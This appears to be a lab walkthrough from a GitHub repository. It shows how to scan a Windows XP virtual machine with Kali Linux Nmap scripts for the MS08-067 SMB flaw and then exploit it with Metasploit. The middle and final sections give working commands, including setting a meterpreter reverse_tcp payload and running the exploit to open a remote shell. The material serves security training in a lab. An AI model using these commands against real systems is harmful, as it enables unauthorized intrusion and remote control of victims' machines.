# Exploiting MS08-067 with Metasploit

This is a step-by-step guide on how to Use Nmap scripting to identify vulnerabilities

Lab: 

In this lab, we will delve into the scripts integrated into Kali Linux and learn how to utilize them effectively for comprehensive reconnaissance on our target system. By leveraging these tools, we aim to enhance our chances of success in ethical hacking endeavors.

Getting Started

1. Initiating the Lab
- Begin by launching Kali Linux and opening a terminal window to kickstart the lab session.

2. Setting Up Your Environment
- Fire up your Windows XP virtual machine (VM) to simulate our target environment.

3. Locating the target Machine's IP Address
- Within the Windows XP VM, identify the IP address of your target machine by executing the command:
  
    $ ipconfig

![image](https://github.com/Cipher-Rachael/Reconnaissance-and-Exploitation-with-Kali-Linux/assets/101173177/91a23d7e-e662-4344-827f-83e107c9cb25)


Finding Nmap Scripts

1. Exploring Nmap Scripts
- Dive into the repository of Nmap scripts available within Kali Linux using the following commands:
  
     $ locate *.nse
     $ locate *vuln*.nse

![image](https://github.com/Cipher-Rachael/Reconnaissance-and-Exploitation-with-Kali-Linux/assets/101173177/4a4dbe6e-8ad3-4abb-a668-84b25507ea21)
 
Locate the script you want to use, in this example I used smb-vuln-ms08-067.nse

![image](https://github.com/Cipher-Rachael/Reconnaissance-and-Exploitation-with-Kali-Linux/assets/101173177/59a973d1-f99c-4dc2-8d54-0399d0e570ea)


Running the Script

1. Executing the SMB Vulnerability Checking Script
- run the SMB vulnerability to check the script against the Windows XP victim machine:
  
   $ nmap --script smb-vuln-ms08-067.nse -p 445 <target IP address>

![image](https://github.com/Cipher-Rachael/Reconnaissance-and-Exploitation-with-Kali-Linux/assets/101173177/28556308-d470-4fbc-9e13-bb5a2f6897ce)
 
After running the script, it shows that the tagert machine is vulnerable to remote code executon.

Exploiting the Vulnerability

1. Accessing Metasploit Framework
- Open up a new terminal window and initiate the Metasploit Framework using:
  
   $ msfconsole
   
![image](https://github.com/Cipher-Rachael/Reconnaissance-and-Exploitation-with-Kali-Linux/assets/101173177/3cb22305-ffe9-4e68-93f3-fb17404b6887)


2. Searching and Using the Exploit
- Employ the search functionality within Metasploit to look for the relevant exploit:
  
   msf6 > search ms08_067

![image](https://github.com/Cipher-Rachael/Reconnaissance-and-Exploitation-with-Kali-Linux/assets/101173177/67737043-cf09-4c03-9337-2584f16797d3)

Once located, proceed with using the exploit (copy and paste it or use the number next to it.

   msf6 > use exploit/windows/smb/ms08_067_netapi 

3. Configuring the Exploit

Use the search options to check the configurations you need to make. 

msf6 > show options

![image](https://github.com/Cipher-Rachael/Reconnaissance-and-Exploitation-with-Kali-Linux/assets/101173177/dc1830fb-0289-4eb1-b827-d0437f85987c)



- Customize the exploit settings by configuring the remote host (RHOST) and defining the payload:
     
   msf6 > set RHOST <target IP address>
   
   msf6 >set PAYLOAD windows/meterpreter/reverse_tcp

![image](https://github.com/Cipher-Rachael/Reconnaissance-and-Exploitation-with-Kali-Linux/assets/101173177/d9e49d4c-2954-44d2-9740-3e92aa336af0)


4. Exploiting the Vulnerability
- Execute the exploit to gain a meterpreter session and establish remote access to the victim machine:
     `
     MSF6 > exploit

![image](https://github.com/Cipher-Rachael/Reconnaissance-and-Exploitation-with-Kali-Linux/assets/101173177/d50c6d72-85ea-4f3a-968a-e9115e6f95a9)


By meticulously following these steps, you will gain invaluable insights into reconnaissance techniques and ethical exploitation methodologies, further enhancing your proficiency as an ethical hacker.
